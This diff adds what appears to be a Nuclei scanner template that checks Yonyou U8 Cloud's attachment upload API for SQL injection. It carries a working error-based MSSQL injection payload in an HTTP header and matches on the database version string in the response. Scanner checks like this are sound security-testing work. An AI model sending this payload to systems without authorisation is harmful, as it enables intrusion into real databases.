@@ -1,0 +1,27 @@
+id: yonyou_u8_cloud-attachment_upload-sqli
+
+info:
+  name: yongyou_u8_cloud-attachment_upload-sqli
+  author: unknow
+  severity: high
+  description: 用友U8 Cloud /attachment/upload SQL注入漏洞
+  tags: yonyou,sqli
+  metadata:
+    fofa-query: 
+
+http:
+  - raw:
+      - |              
+        GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        system: -1' or 1=@@version--+
+
+    matchers:     
+      - type: dsl
+        name: sqli
+        dsl:
+          - (status_code==200 )  && contains(body, "Microsoft SQL Server")
